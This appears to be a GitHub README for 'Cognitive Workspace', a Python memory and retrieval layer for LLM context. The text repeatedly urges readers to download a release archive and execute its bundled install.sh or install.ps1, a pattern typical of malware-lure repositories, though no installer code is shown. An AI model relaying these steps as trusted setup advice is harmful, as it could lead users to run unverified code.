Cognitive Workspace — Active Memory for Infinite LLM Context
============================================================

[![Releases](https://img.shields.io/badge/Releases-download-brightgreen)](https://github.com/Daangerousz/cognitive-workspace/releases)

![Cognitive workspace banner](https://images.unsplash.com/photo-1554475901-4538ddfbccc2?q=80&w=1600&auto=format&fit=crop&ixlib=rb-4.0.3&s=7d1f3b9d0f7b2b7d0b7f5b7b4f8e9a1c)

Tags: artificial-intelligence, cognitive-architecture, infinite-context, information-retrieval, knowledge-management, llm, machine-learning, memory-management, metacognition, multi-turn-dialogue, nlp, openai, python, rag

Quick links
-----------
- Releases: https://github.com/Daangerousz/cognitive-workspace/releases
- Latest build: download the release file from the Releases page and run the included installer

If you need the release file, download the package at https://github.com/Daangerousz/cognitive-workspace/releases. After download, extract the archive and execute the included install script (for example: tar -xzf cognitive-workspace-vX.Y.Z.tar.gz && cd cognitive-workspace && ./install.sh).

Why this project
----------------
Large language models need context. They forget details across long sessions. Cognitive Workspace gives LLMs an active memory. It stores and retrieves relevant information across turns. It links short-term reasoning with long-term facts. The system supports persistent context that scales across hours, days, and workflows.

This repo implements a cognitive workspace architecture that:
- Manages active and background memory stores
- Prioritizes and consolidates memory with metacognition signals
- Integrates retrieval-augmented generation (RAG) for precise responses
- Works with vector stores like FAISS, Milvus, or cloud services
- Provides Python-native APIs and reference agents for multi-turn dialogue

Core concepts
-------------
- Workspace: The live context container. It holds the current session state, active memories, and relevant facts.
- Active memory: Short-term items prioritized for immediate reasoning.
- Background memory: Long-term store for facts and summaries.
- Retriever: Vector-based search that returns relevant memory candidates.
- Consolidator: Merges new facts into memory and creates compressed summaries.
- Metacognition: A scoring layer that rates memory usefulness, decay rate, and recall priority.
- Planner & Executor: High-level control that decides which memories to fetch, when to summarize, and how to act.

Features
--------
- Active memory management with prioritize/decay model
- Vector indexing for semantic search (FAISS, Annoy, Milvus)
- RAG-ready pipelines for safe, grounded responses
- Modular retriever and memory backends
- Lightweight Python API and core CLI tools
- Example agents for multi-turn dialogue and research assistants
- Hooks for OpenAI, local LLMs, or other model providers

Architecture diagram
--------------------
![Architecture](https://images.unsplash.com/photo-1508385082359-f73d8b7a1a8d?q=80&w=1200&auto=format&fit=crop&ixlib=rb-4.0.3&s=1f4efe1b4a8f4a8a2e3b1f8c9d4a2c7b)

Installation
------------
1. Download and run the release installer:
   - Visit https://github.com/Daangerousz/cognitive-workspace/releases
   - Download the latest release archive (for example: cognitive-workspace-vX.Y.Z.tar.gz)
   - Extract and run the installer:
     - Linux/macOS:
       - tar -xzf cognitive-workspace-vX.Y.Z.tar.gz
       - cd cognitive-workspace
       - ./install.sh
     - Windows (PowerShell):
       - Expand-Archive cognitive-workspace-vX.Y.Z.zip
       - cd cognitive-workspace
       - .\install.ps1

2. Install Python deps (if you install from source):
   - python -m venv .venv
   - source .venv/bin/activate
   - pip install -r requirements.txt

3. Configure a vector backend and model provider:
   - Set VECTORDB to faiss/milvus/pinecone
   - Set MODEL_PROVIDER to openai/local
   - Export keys as env vars (OPENAI_API_KEY, PINECONE_API_KEY, etc.)

Quickstart (Python)
-------------------
Minimal example: create a workspace, add memory, and ask a question.

```python
from cognitive_workspace import Workspace, Retriever, LLM

# Create workspace with FAISS retriever
ws = Workspace(name="test_session")
ws.init_vector_store("faiss", dim=1536)

# Add facts and events
ws.add_memory("user_profile", "Name: Alex. Role: Data scientist.")
ws.add_memory("project_fact", "We use FAISS for local vector search.")

# Create an LLM wrapper (OpenAI or local)
model = LLM(provider="openai", model="gpt-4o")

# Ask a contextual question
response = ws.ask("Who is Alex and what tools do we use for search?", model=model)
print(response.text)
```

Example outputs
---------------
- Multi-turn chat with persistent context
- Summaries that compress repeated details into long-term memory
- Retrieval hits that include source links and memory age
- Memory consolidation reports showing which facts merged

APIs and modules
----------------
- Workspace
  - init_vector_store(backend, **opts)
  - add_memory(kind, text, metadata={})
  - recall(query, k=5, scope="active")
  - ask(prompt, model, max_tokens=512)
  - consolidate(interval="daily")
- MemoryStore
  - upsert(items)
  - query(query, top_k)
  - delete(id)
- Retriever
  - embed(texts)
  - search(query_embedding, top_k)
- Planner
  - plan(task, context)
  - schedule(consolidation)
- Executor
  - run(plan, workspace, model)

Memory lifecycle
----------------
1. Observe: Agent or connector adds raw events or facts.
2. Score: Metacognition module rates new items by relevance, novelty, and uncertainty.
3. Prioritize: High-score items enter active memory.
4. Retrieve: Retriever finds top-k candidates for queries.
5. Consolidate: Low-value or old items compress into summaries and move to background memory.
6. Forget: Items decay by score and time; the system can evict or archive them.

Scaling and performance
-----------------------
- For small projects use FAISS on a single node.
- For production, use Milvus or a managed vector DB.
- Shard vectors by tenant or workspace for scale.
- Cache recent retrievals in Redis for low latency.
- Use async pipelines for embedding and indexing to keep front-end latency low.

RAG patterns
------------
- Context window assembly: fetch top-k memories, add source citations.
- Grounding: attach memory provenance to model prompts.
- Re-ranker: run a cheap ranker before expensive model calls.
- Iterative recall: recall, answer, and re-query based on follow-ups.

Security and data handling
--------------------------
- Store sensitive data encrypted at rest.
- Apply access control per workspace or team.
- Use metadata tags to mark private items.
- Rotate keys and audit access logs.

CLI
---
- cw init --name my_session --backend faiss
- cw add --kind note --text "Meeting notes..."
- cw ask --prompt "Summarize the project" --model gpt-4o
- cw consolidate --force

Integrations
------------
- LLMs: OpenAI, Anthropic, local LLMs via Hugging Face
- Vector DBs: FAISS, Milvus, Pinecone, Weaviate
- Connectors: Slack, Email, Google Drive, Notion
- Orchestration: Airflow, Celery, Prefect

Testing
-------
- Run unit tests:
  - pytest tests/unit
- Run integration tests (need keys):
  - pytest tests/integration

Telemetry and observability
---------------------------
- Emit metrics for:
  - retrieval latency
  - memory hit rate
  - consolidation frequency
- Trace flows for request -> retrieval -> model call -> response

Examples and demos
------------------
- agents/chat_agent.py: multi-turn dialogue agent that persists context
- demos/research_assistant.ipynb: research workflow with long-term memory
- examples/connector_slack.py: Slack connector that stores conversation memory

Files in Releases
-----------------
The Releases page contains packaged builds and installers. Download the archive named cognitive-workspace-vX.Y.Z.tar.gz (or .zip on Windows). After extracting the archive, execute the installer script included in the package (install.sh or install.ps1). The installer sets up the environment, installs dependencies, and runs simple checks. Use the Releases page to get the exact file for your platform: https://github.com/Daangerousz/cognitive-workspace/releases.

Contributing
------------
- Fork the repo
- Create a branch feat/short-description
- Add tests for new features
- Open a pull request with a clear description
- Tag issues with relevant labels (bug, enhancement, docs)

Code of conduct
---------------
Follow a calm, professional tone. Respect others. File issues respectfully and include reproductions.

Roadmap
-------
- Priority-based memory decay model
- Adaptive summarization with retrieval-aware prompts
- Federated memory across teams
- Native support for local LLM quantized models

Resources and reading
---------------------
- Retrieval-Augmented Generation (RAG) papers
- FAISS docs: https://github.com/facebookresearch/faiss
- Milvus docs: https://milvus.io
- Papers on memory-augmented models and episodic memory

License
-------
MIT License. See LICENSE file.

Acknowledgments
---------------
- Open-source vector DB projects
- Research on memory and metacognition for AI

Releases again
--------------
Find and download release assets here: https://github.com/Daangerousz/cognitive-workspace/releases

